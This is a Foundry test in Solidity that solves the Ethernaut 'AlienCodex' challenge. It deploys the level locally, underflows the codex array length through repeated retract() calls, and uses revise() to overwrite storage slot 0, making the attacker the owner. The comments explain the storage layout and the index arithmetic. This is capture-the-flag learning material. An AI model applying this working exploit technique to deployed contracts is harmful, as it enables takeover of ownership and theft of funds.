// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

contract AlienCodexTest is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(attacker, 1 ether);
    }

    function testAlienCodexHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        // Deploy the level by hand as it is only compatible with 0.5.0 solidity version
        // The owner of AlienCodex will be the current contract (address(this))
        bytes memory bytecode = abi.encodePacked(vm.getCode("AlienCodex.sol"));
        address alienCodex;
        assembly {
            alienCodex := create(0, add(bytecode, 0x20), mload(bytecode))
        }

        vm.startPrank(attacker);

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Storage of AlienCodex contract
        // | Name    | Type      | Slot | Offset | Bytes |
        // |---------|-----------|------|--------|-------|
        // | _owner  | address   | 0    | 0      | 20    |
        // | contact | bool      | 0    | 20     | 1     |
        // | codex   | bytes32[] | 1    | 0      | 32    |
        //
        // To take ownership of the contract we need to set the owner to the attacker address
        // AlienCodex contract use solidity 0.5.0 hence no automatic under/overfolow checks
        // and do not use a lib to enforce those checks.
        // The dynamic array codex is stored in the following way:
        // length: slot 1
        // data: begin at slot keccak256(abi.encode(1)) and all elements are stored sequentially

        // First makeContact to be able to call other functions due to the contacted modifier
        (bool success, bytes memory data) = alienCodex.call(abi.encodeWithSignature("makeContact()"));
        require(success, "makeContact failed");
        // Ensure contact is true
        (success, data) = alienCodex.call(abi.encodeWithSignature("contact()"));
        require(success, "contact failed");
        bool contact = abi.decode(data, (bool));
        assertEq(contact, true);
        // Record the attacker address in the codex
        (success, data) =
            alienCodex.call(abi.encodeWithSignature("record(bytes32)", bytes32(uint256(uint160(attacker)))));
        require(success, "call failed");
        // Check it was recorded
        (success, data) = alienCodex.call(abi.encodeWithSignature("codex(uint256)", uint256(0)));
        require(success, "call failed");
        bytes32 codex = abi.decode(data, (bytes32));
        assertEq(codex, bytes32(uint256(uint160(attacker))));
        // array data begin here
        uint256 arrayLocation = uint256(keccak256(abi.encode(uint256(1))));
        assertEq(vm.load(alienCodex, bytes32(arrayLocation)), bytes32(uint256(uint160(attacker))));
        // Retract the attacker address from the codex
        (success, data) = alienCodex.call(abi.encodeWithSignature("retract()"));
        require(success, "call failed");
        // Length is now 0
        assertEq(vm.load(alienCodex, bytes32(uint256(1))), bytes32(0));
        // Retract again
        (success, data) = alienCodex.call(abi.encodeWithSignature("retract()"));
        require(success, "call failed");
        // There is no underflow checks hence the length is now type(uint256).max = 2^256 - 1
        assertEq(vm.load(alienCodex, bytes32(uint256(1))), bytes32(type(uint256).max));
        // Hence with revise(uint256 i, bytes32 _content) function
        // it is possible to write in any slots of the contract
        // So it is possible to write in the slot 0 which is the owner of the contract
        // the index will be (2^256 - 1) - arraylocation + 1
        // There are 2^256 slot in total
        //
        // slot 0                 <->       contact & _owner
        // slot 1                 <->       codex.length
        // ..
        // slot arrayLocation     <->       codex[0]
        // slot arrayLocation + 1 <->       codex[1]
        // ..
        // slot 2^256 - 1         <->       codex[2^256 - 1 - arrayLocation]
        // slot 0                 <->       codex[2^256 - arrayLocation]

        // type(uint256).max = 2^256 - 1 hence the index will be
        uint256 arrayIndexToSlot1 = type(uint256).max - arrayLocation + 1;
        (success, data) = alienCodex.call(
            abi.encodeWithSignature(
                "revise(uint256,bytes32)", arrayIndexToSlot1, bytes32(uint256(uint160(address(attacker))))
            )
        );
        require(success, "call failed");

        // The size is 2^256 - 1 of the hence the slot at 2^256 - 1 should not work as it the 2^256nth slot and revert
        uint256 lastSlotIndex = type(uint256).max - arrayLocation;
        vm.expectRevert(); // "EvmError: InvalidFEOpcode" cannot be catch at the moment in foundry
        (success, data) = alienCodex.call(
            abi.encodeWithSignature(
                "revise(uint256,bytes32)", lastSlotIndex, bytes32(uint256(uint160(address(attacker))))
            )
        );
        assertTrue(success, "expectRevert: call did not revert");

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        vm.stopPrank();

        (success, data) = alienCodex.call(abi.encodeWithSignature("owner()"));
        require(success, "call failed");
        address owner = abi.decode(data, (address));

        // Assert the owner of the AlienCodex contract is the attacker
        assertEq(owner, attacker);
    }
}
